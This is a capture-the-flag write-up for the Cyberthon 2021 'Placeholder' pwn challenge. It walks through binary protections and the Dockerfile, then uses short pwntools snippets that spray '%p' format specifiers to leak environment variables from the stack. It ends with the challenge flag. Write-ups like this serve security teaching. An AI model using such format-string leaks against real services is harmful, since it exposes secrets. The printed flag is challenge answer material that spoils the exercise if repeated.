# Placeholder

---

### DESCRIPTION

> Hohoho seems like one of the APOCALYPSE agents messed up big time. Seems this agent went to deploy his/her code for testing and completely forgot to bring down the network service. This careless agent even forgot to private the repository containing the test code, so we've managed to obtain the source for the entire project, dockerfile and all. We've provided you with everything that we've found, so can you get the flag from their server?

> Interact with the service at: aiodmb3uswokssp2pp7eum8qwcsdf52r.ctf.sg:30501

> Note: The dockerfile we provided contains a placeholder flag, do not submit it. Get the actual flag from the network service.

[dist.tar.gz](https://github.com/caprinux/Cyberthon-2021/files/6445850/dist.tar.gz)

---

### Walkthrough

First we check the security of the binary.

```py
[*] '/media/sf_dabian/Challenges/Cyberthon/Pwn/placeholder/files/placeholder'

    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

_uh oh thats lots of protections_

Running the binary, we see that it takes an input and returns it back to us. 

With a little CTF instincts, one can easily guess that there may be a format string vulnerability, and when we tried, yes there is!

![image](https://user-images.githubusercontent.com/76640319/117539374-eadfe480-b03c-11eb-842f-34b6640d0a7a.png)

However, Full RELRO means that we will not be able to overwrite the GOT. PIE means that we probably cant find the exact addresses to overwrite either unless we leak it.

We are immediately limited by our options.

Let's look at the other files provided to us.

```
FROM amd64/ubuntu:focal

ENV user=placeholder
ENV flag=Cyberthon{PLACEHOLDER_FLAG}
RUN useradd -m $user
RUN echo "$user     hard    nproc       20" >> /etc/security/limits.conf

RUN apt-get update
RUN apt-get install -y xinetd

COPY ./placeholder /home/$user/
COPY ./service /etc/xinetd.d/$userservice

RUN chown -R root:$user /home/$user
RUN chmod -R 750 /home/$user
RUN echo "$flag" > /home/$user/flag.txt
RUN chown root:$user /home/$user/flag.txt
RUN chmod 440 /home/$user/flag.txt

USER $user

EXPOSE 1337
CMD ["/usr/sbin/xinetd", "-dontfork"]
```

As you can see, our flag and our user are envrionmental variables. _ok idk the answer at this point_

Just fuzzing the binary, I tried to leak lots of addresses from the stack. I did something like

```py
p = process('./placeholder')
p.sendline('%p.'*50) 
p.recvall()
```

I plugged all the values into cyberchef and decoded via hex but all I got were rubbish bytes. 

By this time, I had something else urgent going on and I couldn't work on it anymore.

---
### RANT

_imagine the frustration when ur just like 2 letters away from 1000 pt chall_

```py
p = process('./placeholder')
p.sendline('%p.'*1100) 
p.recvall()
```

In fact, envrionmental variables are stored on the stack, but at the very end. Hence you have to leak enough addresses.

However, it may be a little tricky as PIE and ASLR is enabled so the number of addresses to leaked is not fixed. 

If you leak more than what the stack has, the program crashes.

However, if you do not leak enough, your flag doesn't come out. Hence it took a few runs of the script to get a satisfactory result.

![image](https://user-images.githubusercontent.com/76640319/117539674-46f73880-b03e-11eb-9bc2-fc380a7e3902.png)

![image](https://user-images.githubusercontent.com/76640319/117539685-52e2fa80-b03e-11eb-81b8-8a72a526e7b4.png)

```
Cyberthon{d0nt_d3pl0y_1nc0mpl3t3_pr0j3ct5}
```
